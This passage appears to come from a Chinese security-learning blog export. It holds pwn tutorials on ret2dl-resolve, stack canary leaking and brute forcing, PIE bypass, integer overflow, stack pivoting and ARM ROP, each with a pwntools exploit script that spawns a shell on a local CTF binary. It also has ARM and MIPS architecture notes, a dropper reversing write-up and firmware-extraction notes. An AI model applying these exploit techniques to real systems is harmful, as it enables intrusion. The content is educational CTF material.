elf.get_section_by_name(&#x27;.dynsym&#x27;).header.sh_addr #0x80481d8dynstr_addr = elf.get_section_by_name(&#x27;.dynstr&#x27;).header.sh_addr #0x8048278resolve_plt = 0x08048380leave_ret_addr = 0x0804851d start = 0x804aa00fake_rel_plt_addr = startfake_dynsym_addr = fake_rel_plt_addr + 0x8fake_dynstr_addr = fake_dynsym_addr + 0x10bin_sh_addr = fake_dynstr_addr + 0x7n = fake_rel_plt_addr - rel_plt_addrr_info = (int((fake_dynsym_addr - dynsym_addr)/0x10) &lt;&lt; 8) + 0x7str_offset = fake_dynstr_addr - dynstr_addrfake_rel_plt = p32(elf.got[&#x27;read&#x27;]) + p32(r_info)fake_dynsym = p32(str_offset) + p32(0) + p32(0) + p32(0x12000000)fake_dynstr = b&quot;system\\x00/bin/sh\\x00\\x00&quot;pay1 = b&#x27;a&#x27;*108 + p32(start - 20) + p32(elf.plt[&#x27;read&#x27;]) + p32(leave_ret_addr) + p32(0) + p32(start - 20) + p32(0x100)p.recvuntil(&#x27;Welcome to RET_TO_DL~!\\n&#x27;)#p.recvuntil(&quot;Nice to meet you~!\\n&quot;)p.sendline(pay1)sleep(1)pay2 = p32(0x0) + p32(resolve_plt) + p32(n) + b&#x27;aaaa&#x27; + p32(bin_sh_addr) + fake_rel_plt + fake_dynsym + fake_dynstrp.sendline(pay2)success(&quot;.rel_plt: &quot; + hex(rel_plt_addr))success(&quot;.dynsym: &quot; + hex(dynsym_addr))success(&quot;.dynstr: &quot; + hex(dynstr_addr))success(&quot;fake_rel_plt_addr: &quot; + hex(fake_rel_plt_addr))success(&quot;fake_dynsym_addr: &quot; + hex(fake_dynsym_addr))success(&quot;fake_dynstr_addr: &quot; + hex(fake_dynstr_addr))success(&quot;n: &quot; + hex(n))success(&quot;r_info: &quot; + hex(r_info))success(&quot;offset: &quot; + hex(str_offset))success(&quot;system_addr: &quot; + hex(fake_dynstr_addr))success(&quot;bss_addr: &quot; + hex(elf.bss()))p.interactive() 击败cancary基本原理函数开始执行的时候会先往栈底插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法(栈帧销毁前测试该值是否被改 变)，如果不合法就停止程序运行(发生了栈溢出); 在Linux当中我们将这段cookie信息称为Canary ,Canary是一个低字节为\\x00的16进制数; 因为Canary在局部变量的后边,在EBP或RBP的前面所以当攻击者覆盖返回地址的时候往往也会将cookie信息给覆盖掉,这就会导致栈保护检查失败而阻止payload的执行,从而避免漏洞利用成功. 绕过方法方法一:泄露栈中的Canary: Canary设计为以字节×O0O结尾,其本意就是为了保证Canary 可以截断字符串,防止我们输出字符串的时候将Canary打印出来;所以泄露栈中的Canary的思路是将Canary的低字节\\x00覆盖，然后连同用户的字符串一起打印出剩余的Canary部分; 当我们打印出完整的Canary后,在溢出的时候再将正确Canary填回去,就可以进行控制返回地址,控制程序流程了. 条件: 1.有合适的输出函数 2.泄露Canary后程序不会崩溃 例题： exp： 12345678910111213141516171819202122232425from pwn import *#context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;)context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;deepin-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]name = &#x27;./pwn1&#x27;p = process(name)elf = ELF(name)if args.G: gdb.attach(p)p.recvuntil(&quot;Welcome!\\n&quot;)payload = &quot;a&quot;*28 + &quot;b&quot;*4p.sendline(payload)p.recvuntil(&quot;bbbb&quot;)canary = u32(p.recv(4)) - 0xasuccess(&quot;canary: &quot; + hex(canary))getshell_addr = 0x804858bpayload1 = b&quot;a&quot;*32 + p32(canary) + b&quot;b&quot;*12 + p32(getshell_addr)p.sendline(payload1)p.interactive() 方法二:爆破Canary: 对于Canary,虽然每次进程重启后的Canary 不同(相比GS，GS重启后是相同的)但是同一个进程中的不同线程的Canary 是相同的,并且通过fork函数创建的子进程的Canary也是相同的,因为fork函数会直接拷贝父进程的内存。 我们可以利用这样的特点，彻底逐个字节将Canary爆破出来. 缺点:多进程程序,32位程序需要爆破3字节,64位程序需要爆破7字节,需要爆破较多. 其他方法: 1.联合其他漏洞修改劫持_stack_chk_fail函数; 例题： 1234567891011121314151617181920212223242526from pwn import *name = &#x27;./pwn2&#x27;p = process(name)elf = ELF(name)p.recvuntil(&#x27;welcome\\n&#x27;)canary = &#x27;\\x00&#x27;for i in range(3): print(hex(i)) for j in range(256): print(hex(j)) p.send(&#x27;a&#x27;*100 + canary + chr(j)) a = p.recvuntil(&quot;welcome\\n&quot;) if b&quot;recv&quot; in a: canary += chr(j) breakcanary = u32(canary)success(&quot;canary: &quot; + hex(canary))getflag = 0x0804863Bpayload = b&#x27;a&#x27;*100 + p32(canary) + b&#x27;a&#x27;*12 + p32(getflag)p.sendline(payload)p.interactive() PIE绕过：position-independent executable,地址无关可执行文件,该技术就是一个针对代码段.text,数据段.*data，.bss等固定地址的一个防护技术应用了PIE的程序会在每次加载时都变换加载基址，从而使ropper等工具无法得到准确的地址. 方法一: Partial Write部分写入技术,由于内存的页载入机制，PIE的随机化只能影响到单个内存页;通常来说,一个内存页大小为Ox1000,这就意味着不管地址怎么变，某条指令的后12位，3个十六进制数的地址是始终不变的就是利用了PIE后12位地址不变的特点,通过覆盖EIP的后8或16位(按字节写入每字节8位)就可以快速爆破或者直接劫持EIP; 特点: 1.程序不大,有后门函数等;2.只需要爆破一个字节 例题 1234567891011121314151617181920212223242526272829from pwn import *i = 0while True: i += 1 print (i) if(i &gt; 0xff): print(&quot;Wrong!&quot;) break io = process(&quot;./partial_write&quot;) io.recv() payload = &#x27;a&#x27;*40 payload += &#x27;\\xca&#x27; #strncpy复制202个字节造成溢出 io.sendline(payload) io.recv() payload = &#x27;a&#x27;*200 payload += &#x27;\\x01\\x39&#x27; #frontdoor的地址后三位是0x900, +1跳过push rbp 爆破的是3 io.sendline(payload) io.recv() try: io.recv(timeout = 1) except EOFError: io.close() continue else: sleep(0.1) io.sendline(&#x27;/bin/sh\\x00&#x27;) sleep(0.1) io.interactive() #没有EOFError的话就是爆破成功，可以开shell break 方法二:直接泄露地址因为PIE影响的只是程序加载基址，并不会影响指令间的相对地址,如果我们可以泄露出一个程序或ibc的某些地址，我们就可以利用地址减去偏移地址得到基地址,从而算出其他函数的地址,这种方法也是我们最常用的方法.通过泄露地址来计算libc基地址的时候需要注意的是libc版本不同,对应的偏移也不同. 例题： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from pwn import *context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;deepin-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]name = &#x27;./pwn1&#x27;p = process(name)elf = ELF(name)if args.G: gdb.attach(p)p.recvuntil(&quot;Tell me your name:\\n&quot;)payload = &quot;a&quot;*8p.send(payload)p.recvuntil(&quot;a&quot;*8)pro_addr = u64(p.recv(6) + b&quot;\\x00\\x00&quot;) - 0x82dputs_got_addr = pro_addr + elf.got[&#x27;puts&#x27;]puts_plt_addr = pro_addr + elf.plt[&#x27;puts&#x27;]main_addr = pro_addr + elf.symbols[&#x27;main&#x27;]success(&quot;pro_addr: &quot; + hex(pro_addr))success(&quot;puts_got_addr: &quot; + hex(puts_got_addr))success(&quot;puts_plt_addr: &quot; + hex(puts_plt_addr))success(&quot;main_addr: &quot; + hex(main_addr))p.recvuntil(&quot;What do you want to say?\\n&quot;)pop_rdi_addr = pro_addr + 0x843payload1 = b&quot;a&quot;*184 payload1 += p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr)payload1 += p64(main_addr)p.sendline(payload1)p.recvuntil(&quot;Bye!\\n&quot;)libc_addr = u64(p.recv(6) + b&quot;\\x00\\x00&quot;) - 0x68f90system_addr = libc_addr + 0x3f480bin_sh_addr = libc_addr + 0x1619d9success(&quot;libc_addr: &quot; + hex(libc_addr))success(&quot;system_addr: &quot; + hex(system_addr))success(&quot;bin_sh_addr: &quot; + hex(bin_sh_addr))p.recvuntil(&quot;Tell me your name:\\n&quot;)p.sendline(&quot;aaa&quot;)p.recvuntil(&quot;What do you want to say?\\n&quot;)payload2 = b&quot;c&quot;*184 payload2 += p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr) p.sendline(payload2)p.interactive() 整数溢出：类型一:未限制范围这种情况主要是变量有固定大小的字节,但是却允许我们输入无限多的数据,和gets()函数产生的栈溢出很相似 类型二:错误的类型转换正确的对变量进行了约束但是在类型转换上面出错了,范围大的变量赋值给范围小的变量 例题： 程序为dest分配了0x14字节的储存空间，而第二个read函数可以读取0x199个字节，这个地方存在栈溢出 12345678910111213from pwn import *p = process(&quot;./int_over&quot;)payload = b&quot;a&quot;*24 + p32(0x804868b)payload += b&quot;b&quot;*(0x104 - len(payload))p.recvuntil(&quot;Your choice:&quot;)p.sendline(&quot;1&quot;)p.recvuntil(&quot;Please input your username:\\n&quot;)p.sendline(&quot;sir&quot;)p.recvuntil(&quot;Please input your passwd:\\n&quot;)p.sendline(payload)p.interactive 栈迁移：劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行ROP等操作;通俗的讲其实就是将ESP或RSP指针修改为我们可以控制的内存区地址比如bss段堆等位置,然后在可控内存区当中布置payload等; 条件: 1.程序存在溢出;2.可以控制sp指针; 用途: 1.栈益出可以溢出的空间大小不足 因为我们的主要思想是修改sp指针,所以我们需要通过一些汇编指令来修改sp指针,常用汇编指令:; 1.pop esp;2.pop ecx; lea esp,[ecx-Ox4];3.leave; ret; —&gt; mov esp, ebp; pop ebp; ret; 需要注意的地方: 1.迁移过去的内存一定要可读可写; ⒉.迁移过去的内存要注意离不可读不可写的内存要远一些,因为调用一些函数的时候需要较大的栈空间; 3.我们构造的栈空间和程序的栈空间有相同的性质,即push,pop等操作对sp,bp指针的操作一样; 例题： 1234567891011121314151617181920212223242526272829from pwn import *context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;deepin-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]p = process(&quot;./test1&quot;)if args.G: gdb.attach(p)bin_sh_addr = 0x80495d0system_plt = 0x8048370read_plt = 0x8048340leave_ret = 0x80484d5pop3_ret = 0x080485a9gadgets = 0x8048549bss = 0x804a560payload = p32(read_plt) + p32(pop3_ret) + p32(0) + p32(bss) + p32(100) payload += p32(gadgets) + p32(bss + 4)p.recvuntil(&quot;Hello,tell me your story:\\n&quot;)p.sendline(payload)payload1 = b&quot;b&quot;*10 + p32(0x804a060 + 4)p.recvuntil(&quot;By the way, what&#x27;s your name:\\n&quot;)p.sendline(payload1)sleep(1)payload2 = p32(system_plt) + b&quot;aaaa&quot; + p32(bin_sh_addr) p.sendline(payload2)p.interactive()","categories":[{"name":"pwn","slug":"pwn","permalink":"http://example.com/categories/pwn/"}],"tags":[{"name":"栈溢出","slug":"栈溢出","permalink":"http://example.com/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"}],"keywords":[{"name":"pwn","slug":"pwn","permalink":"http://example.com/categories/pwn/"}]},{"title":"armpwn入门","slug":"armpwn入门","date":"2022-07-04T16:00:00.000Z","updated":"2022-07-05T13:57:05.731Z","comments":true,"path":"2022/07/05/armpwn入门/","link":"","permalink":"http://example.com/2022/07/05/armpwn%E5%85%A5%E9%97%A8/","excerpt":"","text":"调试 常用命令info functions ：显示程序的使用的函数 disassemble 函数名 ：反汇编指定函数 查看内存命令x&#x2F;&lt;n&#x2F;f&#x2F;u&gt; n是一个正整数，表示显示内存的长度f 表示显示的格式 u表示从当前地址往后请求的字节数(u参数可以用下面的字符来代替b表示单字节，h表示双字节，w表示四字节，g表示八字节) 编译arm架构程序并用qemu执行1234#编译arm-linux-gnueabihf-gcc -g hello.c -o eastgets#qemu执行 动态链接程序，需要指定libc的位置qemu-arm -L /usr/arm-linux-gnueabihf/ ./eastgets typo(例题) 32位arm小端，静态编译，没有符号表 恢复符号表对于静态编译的 bianry， 可以使用 lscan, flirt, rizzo, bindiff 等多种方法恢复部分符号表 https://www.freebuf.com/articles/terminal/134980.html arm架构的libc在 &#x2F;usr&#x2F;arm-linux-gnueabihf&#x2F;lib里面 尝试恢复符号表： （1）下载对应libc.so sudo apt install libc6-armhf-cross cp &#x2F;usr&#x2F;arm-linux-gnueabihf&#x2F;lib&#x2F;libc-2.23.so .&#x2F; （2）下载rizzo插件 使用rizzo插件： https://github.com/fireundubh/IDA7-Rizzo 放入：C:\\Program Files\\IDA 7.0\\plugins （3）用IDA打开libc-2.23.so 导出libc.23.so.riz: File-&gt;Produce file-&gt;Rizzo signature file （4）打开目标程序 加载.riz: File-&gt;Load file-&gt;Rizzo signature file 溢出函数 arm架构下32bit程序，函数的前四个参数分别保存在r0~r3寄存器中，其余的参数在栈中，函数返回值 保存在寄存器r0中。 找到0x20904，将“&#x2F;bin&#x2F;sh”地址赋给r0，并将system的地址赋给pc，就可以执行system(“&#x2F;bin&#x2F;sh”) 12345678from pwn import *payload = &quot;A&quot;*112 + p32(0x20904) + p32(0x6c384)*2 + p32(0x110b4)p = process(&quot;./typo&quot;)p.recvuntil(&quot;quit&quot;)p.send(&quot;\\n&quot;)p.recvuntil(&quot;----&quot;)p.sendline(payload)p.interactive()","categories":[{"name":"pwn","slug":"pwn","permalink":"http://example.com/categories/pwn/"}],"tags":[{"name":"arm","slug":"arm","permalink":"http://example.com/tags/arm/"}],"keywords":[{"name":"pwn","slug":"pwn","permalink":"http://example.com/categories/pwn/"}]},{"title":"mips基础","slug":"Mips基础","date":"2022-07-02T16:00:00.000Z","updated":"2022-07-28T12:46:00.837Z","comments":true,"path":"2022/07/03/Mips基础/","link":"","permalink":"http://example.com/2022/07/03/Mips%E5%9F%BA%E7%A1%80/","excerpt":"","text":"基本特点 寄存器 流水线操作 寻址方式 指令格式 指令集基础运算 逻辑运算 移位运算 访存 跳转 CPU控制指令 其他指令 MIPS 汇编 | FreeFlyingSheep 的小站","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[{"name":"mips","slug":"mips","permalink":"http://example.com/tags/mips/"}],"keywords":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}]},{"title":"arm基础","slug":"arm基础","date":"2022-06-30T16:00:00.000Z","updated":"2022-09-13T11:02:38.989Z","comments":true,"path":"2022/07/01/arm基础/","link":"","permalink":"http://example.com/2022/07/01/arm%E5%9F%BA%E7%A1%80/","excerpt":"","text":"arm工作模式ARM之所以设计出这么多种模式出来，就是为了「应对CPU在运行时各种突发事件」，比如要支持正常的应用程序的运行，在运行任何一个时间点又可能发生很多异常事件，比如：关机、收到网卡信息、除数为0、访问非法内存、解析到了非法指令等等，不光要能处理这些异常还要能够从异常中再返回到原来的程序继续执行。 两种工作状态1、ARM状态：32位，ARM状态执行字对齐的32位ARM指令。 2、Thumb状态，16位，执行半字对齐的16位指令。 注：1、ARM和Thumb两种状态之间的切换不影响处理器的工作模式和寄存器的内容。 ​ 2、ARM处理器在处理异常时，不管处理器处于什么状态，则都将切换到ARM状态。 寄存器 通用寄存器包括R0~R15,可以分为3类: 未分组寄存器R0~R7 分组寄存器R8~R14、R13(SP) 、R14(LR) 程序计数器PC(R15)、R8_fiq-R12_fir为快中断独有 1. 未分组寄存器R0~R7在所有运行模式下,未分组寄存器都指向同一个物理寄存器,它们未被系统用作特殊的用途.因此在中断或异常处理进行运行模式转换时,由于不同的处理器运行模式均使用相同的物理寄存器,所以可能造成寄存器中数据的破坏。 2. 分组寄存器R8~R14对于分组寄存器,它们每一次所访问的物理寄存器都与当前处理器的运行模式有关。 对于R8R12来说,每个寄存器对应2个不同的物理寄存器,当使用FIQ(快速中断模式)时,访问寄存器 R8_fiqR12_fiq;当使用除FIQ模式以外的其他模式时,访问寄存器R8_usr~R12_usr。 对于R13,R14来说,每个寄存器对应7个不同的物理寄存器,其中一个是用户模式与系统模式共用,另外6个物理寄存器对应其他6种不同的运行模式,并采用以下记号来区分不同的物理寄存器: 1R13_mode R14_mode 其中mode可为:「usr,fiq,irq,svc,abt,und,mon」。 3. 寄存器R13（sp）在ARM指令中常用作「堆栈指针」,用户也可使用其他的寄存器作为堆栈指针,而在Thumb指令集中,某些指令强制性的要求使用R13作为堆栈指针。 寄存器R13在ARM指令中常用作堆栈指针，但这只是一种习惯用法，用户也可使用其他的寄存器作为堆栈指针。而在Thumb指令集中，某些指令强制性的要求使用R13作为堆栈指针。 由于处理器的每种运行模式均有自己独立的物理寄存器R13，在用户应用程序的初始化部分，一般都要初始化每种模式下的R13，使其指向该运行模式的栈空间。这样，当程序的运行进入异常模式时，可以将需要保护的寄存器放入R13所指向的堆栈，而当程序从异常模式返回时，则从对应的堆栈中恢复，采用这种方式可以保证异常发生后程序的正常执行。 4. R14（LR）链接寄存器(Link Register)当执行子程序调用指令(BL)时,R14可得到R15(程序计数器PC)的备份。 在每一种运行模式下，都可用R14保存子程序的返回地址，当用BL或BLX指令调用子程序时，将PC的当前值复制给R14，执行完子程序后，又将R14的值复制回PC，即可完成子程序的调用返回。以上的描述可用指令完成。 从子程序返回：「方法1：」 123 MOV PC, LR或者 BX LR 「方法2：」 在子程序入口处使用以下指令将R14存入堆栈： 1STMFD SP！,&#123;,LR&#125; 对应的，使用以下指令可以完成子程序返回： 1LDMFD SP！,&#123;,PC&#125; 5. R15(PC)程序状态寄存器寄存器R15用作程序计数器(PC),在ARM状态下,位[1:0]为0,位[31:2]用于保存PC,在Thumb状态下,位[0]为0,位[31:1]用于保存PC。 比如如果pc的值是0x40008001,那么在寻址的时候其实会查找地址0x40008000，低2位会自动忽略掉。「个中原因，请读者自己思考?」 由于ARM体系结构采用了多级流水线技术，对于ARM指令集而言，PC总是指向当前指令的下两条指令的地址,即PC的值为当前指令的地址值加8个字节。 1即：PC值=当前程序执行位置+8 6. CPSR、SPSR「CPSR」(Current Program Status Register，当前程序状态寄存器)，CPSR可在任何运行模式下被访问，它包括条件标志位、中断禁止位、当前处理器模式标志位，以及其他一些相关的控制和状态位。 每一种运行模式下又都有一个专用的物理状态寄存器，称为「SPSR」(Saved Program Status Register，备份的程序状态寄存器)，当异常发生时，SPSR用于保存CPSR的当前值，从异常退出时则可由SPSR来恢复CPSR。 由于用户模式和系统模式不属于异常模式，它们没有SPSR，当在这两种模式下访问SPSR，结果是未知的。 寄存器CPSR格式如下： 条件码标志(condition code flags) 「N,Z,C,V」均为条件码标志位,它们的内容可被算术或逻辑运算的结果所改变,并且可以决定某条指令是否被执行。 在ARM状态下,绝大多数的指令都是有条件执行的,在Thumb状态下,仅有分支指令是有条件执行的。 「N (Number)」: 当用两个补码表示的带符号数进行运算时,N&#x3D;1表示运行结果为负,N&#x3D;0表示运行结果为正或零 「Z :(Zero)」: Z&#x3D;1表示运算结果为零,Z&#x3D;0表示运行结果非零 「C」 : 可以有4种方法设置C的值： (Come)加法运算(包括CMP):当运算结果产生了进位时C&#x3D;1,否则C&#x3D;0 减法运算(包括CMP):当运算产生了借位,C&#x3D;0否则C&#x3D;1 对于包含移位操作的非加&#x2F;减运算指令 ,C为移出值的最后一位 对于其他的非加&#x2F;减运算指令C的值通常不改变 「V」 :(oVerflow)对于加&#x2F;减法运算指令,当操作数和运算结果为二进制的补码表示的带符号位溢出时,V&#x3D;1表示符号位溢出;对于其他的非加&#x2F;减运算指令V的值通常不改变 「Q」： 在ARM V5及以上版本的E系列处理器中，用Q标志位指示增强的DSP运算指令是否发生了溢出。在其它版本的处理器中，Q标志位无定义 「J：」仅ARM v5TE-J架构支持 , T&#x3D;0;J &#x3D; 1 处理器处于Jazelle状态,也可以和其他位组合. 「E位：」 大小端控制位 「A位：」 A&#x3D;1 禁止不精确的数据异常 「T :」 T &#x3D; 0;J&#x3D;0; 处理器处于 ARM 状态 T &#x3D; 1;J&#x3D;0 处理器处于 Thumb 状态 T &#x3D; 1;J&#x3D;1 处理器处于 ThumbEE 状态 控制位 CPSR的低8位(包括I,F,T和M[4:0])称为控制位,当发生异常时这些位可以被改变,如果处理器运行特权模式,这些位也可以由程序修改。 「中断禁止位I,F」【重要】 I&#x3D;1 禁止IRQ中断 F&#x3D;1 禁止FIQ中断 比如我们要想在程序中实现禁止中断，那么就需要将CPSR[7]置1。 运行模式位[4-0] bite 模式 ARM模式可访问的寄存器 注意观察这5个bit的特点，最高位都是1，低4位的值则各不相同，这个很重要，要想搞清楚uboot、linux的源码，尤其是异常操作的代码，必须要知道这几个bit的值。 流水线 关键指令 跳转 伪代码","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[{"name":"arm","slug":"arm","permalink":"http://example.com/tags/arm/"}],"keywords":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}]},{"title":"dropper","slug":"dropper","date":"2022-06-29T01:49:45.000Z","updated":"2022-06-29T15:58:39.854Z","comments":true,"path":"2022/06/29/dropper/","link":"","permalink":"http://example.com/2022/06/29/dropper/","excerpt":"","text":"Dropper 什么是Dropper Dropper是将程序嵌入到自己的内部。 类似于双进程，运行后解密了资源表的数据，本题是一个exe文件，然后作为子进程被创建了 解题 开始一个UPX壳，upx -d 的话无法运行 ，手动去壳,试了很多遍， rax会运行错误。 静态分析： （如果不给题目名称如何看出是dropper技术 进入，上面几个qword是函数调用但是识别失败。最后一个异或0x73，解密资源的地方，接着主程序后面就是创建一个进程，并把刚刚解密出的pe文件手动装载进行内存，然后恢复执行。 下面我们用Process-Dump来dump出子程序 如何使用Process Dump 1pd64.exe -pid **** dump出我们需要的子程序， 主要逻辑为一个int a[500]的数组来实现这个大数的存储及运算 这里的第88行*14 通过交叉引用可以推断出是什么，其初始化在Sub_7FF7D0F21433, 将sub_7FF7D0F2167C的地址赋给前四个字节 sub_7FF7D0F2167C函数主要两个功能，对数值的转换，然后check 对大数的运算 调试提取数据，有一个除0异常，直接跳过即可。 12345678910111213141516171819202122232425262728293031323334import base64enc = [0x000020F1, 0x00001DA9, 0x00000156, 0x00000B37, 0x000007C0, 0x0000066A, 0x000024E0, 0x00000D42, 0x00002077, 0x000007EC, 0x00001BA7, 0x00002071, 0x000000F8, 0x00000291, 0x000003DA, 0x0000157C, 0x00001EF4, 0x00002519, 0x00000C25, 0x00002062, 0x00002253, 0x00000640, 0x000008DF, 0x00001E34, 0x00002140, 0x00000F92, 0x0000039B, 0x0000126F, 0x00002403, 0x00000E65, 0x000001F0, 0x00001868, 0x0000016D, 0x000006B6, 0x00002214, 0x00001603, 0x00001925, 0x000016AE, 0x000012D0, 0x00001831, 0x0000018C, 0x00000BF7, 0x00000E97, 0x000000CE, 0x0000061C, 0x00000390, 0x000019E9, 0x000022A5, 0x00001601, 0x00001A1E, 0x000013D1, 0x00000DBC, 0x0000117D, 0x0000225F, 0x00002272, 0x0000007B, 0x000023E6, 0x0000069F, 0x000002D3, 0x00001BEF, 0x000003E6, 0x000017D4, 0x00002284, 0x000003B8, 0x00000251, 0x00001646, 0x00000176, 0x0000081E, 0x000024C3, 0x00001E85, 0x00001097, 0x00001264, 0x00000A34, 0x00001A3B, 0x00000FE7, 0x000026A6, 0x00001F43, 0x00001832, 0x000021AE, 0x0000023C, 0x000004C2, 0x00002585, 0x000017E7, 0x000015DD, 0x00002610, 0x00001B86, 0x00000D2A, 0x00000716, 0x00001C25, 0x00002099]data = [[0x000024AC, 0x00000116, 0x000004F4, 0x00000B64, 0x00001DC3, 0x00001B4A, 0x000001B2, 0x00001FCE, 0x00000E81, 0x000025AB, 0x0000015B, 0x0000252D, 0x000002AC, 0x00000F77, 0x000022F5, 0x000019E3, 0x00001C53, 0x00000B66, 0x000011BC, 0x0000193A], [0x00000DC6, 0x00000854, 0x000015F5, 0x00002567, 0x000008FA, 0x00000E20, 0x00000807, 0x00001007, 0x000018CC, 0x00001E84, 0x00001F11, 0x000013D4, 0x0000076A, 0x00001461, 0x00000B0F, 0x00001F70, 0x00001B3D, 0x00001008, 0x00000D52, 0x0000049A], [0x00001A89, 0x00000E42, 0x000000FA, 0x0000100D, 0x000014DD, 0x00001BFC, 0x000026DB, 0x00001AC2, 0x00001CA0, 0x000005ED, 0x00000834, 0x000016BF, 0x00000704, 0x00001FAD, 0x000025FD, 0x00001142, 0x00001EEE, 0x00001E60, 0x00000353, 0x000015A8], [0x00000E17, 0x00000706, 0x00000C1F, 0x00000169, 0x00002248, 0x000007FD, 0x00001768, 0x00001F54, 0x00001574, 0x00002458, 0x00000374, 0x00001D6B, 0x00000918, 0x00000ECF, 0x0000211D, 0x00001D96, 0x00001BEB, 0x00001703, 0x00001B87, 0x000006FA], [0x00000AE3, 0x0000069F, 0x000001EF, 0x00001C15, 0x00001378, 0x000020D1, 0x0000211D, 0x00002275, 0x000005F4, 0x00002475, 0x00000D13, 0x000008EF, 0x00000E10, 0x000006D4, 0x0000215A, 0x000004D6, 0x0000202F, 0x00001B99, 0x00001C86, 0x000002F1], [0x00000680, 0x000000D4, 0x00000677, 0x00001E21, 0x0000220D, 0x00000933, 0x00000973, 0x00001947, 0x00000D61, 0x0000247F, 0x00001D21, 0x00001FA2, 0x00001606, 0x000007B0, 0x00001829, 0x000016C0, 0x000026C9, 0x0000248C, 0x00000C9A, 0x00001F8F], [0x0000257F, 0x00000359, 0x00001831, 0x000021B7, 0x00000BA8, 0x00000FC5, 0x00000BA4, 0x000024E2, 0x00001241, 0x00000D53, 0x00000C82, 0x00001240, 0x00002241, 0x00001156, 0x0000116A, 0x000005F3, 0x000022D5, 0x000008DA, 0x000014A3, 0x0000059E], [0x00001675, 0x00000AA9, 0x00000D8B, 0x00000D31, 0x00001722, 0x000006C8, 0x0000151B, 0x000017D8, 0x00001FEF, 0x00001624, 0x00002307, 0x00000CB9, 0x0000053C, 0x00000230, 0x00001EAA, 0x00001FD1, 0x00000FAD, 0x00001E30, 0x00002345, 0x00001583], [0x000001D1, 0x0000056E, 0x00000AA3, 0x0000223C, 0x000009A4, 0x000006C9, 0x00000112, 0x00001977, 0x00002512, 0x00000B60, 0x0000081A, 0x00000F06, 0x00001329, 0x000011AA, 0x00002404, 0x00000E57, 0x0000011E, 0x000011DC, 0x00002474, 0x00001BC7], [0x000022BE, 0x00001F17, 0x00000588, 0x00001B80, 0x00001479, 0x000016EF, 0x000008CA, 0x00000D6E, 0x0000138F, 0x00001054, 0x000021FA, 0x00000102, 0x000013A6, 0x00000195, 0x000002D1, 0x00002594, 0x00001369, 0x00002534, 0x000015C5, 0x0000168A]]enc1 = 0for i in enc[::-1]: enc1 = enc1*10000+idata1= [0]*10for i, val in enumerate(data): #enumerate() 函数用于将一个可遍历的数据对象(如列表、元组或字符串)组合为一个索引序列，同时列出数据和数据下标，一般用在 for 循环当中 for j in val[::-1]: data1[i] = data1[i]*10000+jenc1 += data1[9]enc1 -= data1[8]enc1 += data1[7]enc1 -= data1[6]enc1 += data1[5]enc1 //= data1[4]enc1 -= data1[3]enc1 += data1[2]enc1 //= data1[1]enc1 -= data1[0]ans = &#x27;&#x27;while enc1: ans += chr(enc1%128) enc1 //= 128print(base64.b64decode(ans))","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[{"name":"-[ACTF] -[dropper]","slug":"ACTF-dropper","permalink":"http://example.com/tags/ACTF-dropper/"}],"keywords":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}]},{"title":"固件分析初试","slug":"固件逆向分析初试","date":"2022-06-24T11:50:10.000Z","updated":"2022-08-08T13:25:00.254Z","comments":true,"path":"2022/06/24/固件逆向分析初试/","link":"","permalink":"http://example.com/2022/06/24/%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%88%9D%E8%AF%95/","excerpt":"","text":"m U-Boot(Universal Boot Loader)，即通用Bootloader，是德国DENX小组开发的用于多种嵌入式CPU的bootloader程序 Legacy-uImage在kernel镜像的基础上，加上64Byte的信息提供给uboot使用 binwalk分析一下，是Squashfs文件系统 Binwalk如何进行提取：通过maigc特征集与文件进行比对，但识别效率比file命令高多了 binwalk -Me 解压得到 文件系统是操作系统的重要组成部分，是操作运行的基础。不同的路由器使用的文件系统格式不尽相同。根文件系统会被打包成当前路由器所使用的文件系统格式，然后组装到固件中。路由器希望文件系统越小越好，所以这些文件系统中各种压缩格式随处可见。 Squashfs是一个只读格式的文件系统，具有超高压缩率，其压缩率最高可达34%。当系统启动后，会将文件系统保存在一个压缩过的文件系统文件中，这个文件可以使用换回的形式挂载并对其中的文件进行访问，当进程需要某些文件时，仅将对应部分的压缩文件解压缩。 Squashfs文件系统常用的压缩格式有GZIP、LZMA、LZO、XZ（LZMA2）。路由器的根文件系统通常会按照Squashfs文件系统常用压缩格式中的一种进行打包，形成一个完整的Squashfs文件系统，然后与路由器操作系统的内核一起形成更新固件。 由于squashFS可以在不需要解压的情况下直接挂载，因此有许多应用场景，例如： 1、安装Linux时用的live cd 2、小型嵌入式设备中的rootfs。rootfs一般以压缩好的形式存放在ROM中，如果开机时把整个rootfs都解压到内存里再读取，对于ROM和RAM容量一般都很小的小型嵌入式设备来说性价比太低。 0x2 静态分析从Dlink固件里面提取样本，打开发现被加密了。 如生成字典用的crunch、rsmangler，爆破用的frackzip等 直接使用教程的密码beUT9Z，解压如下 .mbn：高通的一套用于加载网络环境的文件（modem software configuration） .yaffs2：针对NAND芯片设计的嵌入式文件系统，可用unyaffs提取 核心应该是2K-mdm-image-mdm9625.yaffs2，用unyaffs提取 1unyaffs 2K-mdm-image-mdm9625.yaffs2 yaffs2-root/ 接下来我们查找该路径下的所有.conf文件，.conf文件多是配置文件，有可能从中可以发现敏感的信息。 1find . -name &#x27;*.conf&#x27; 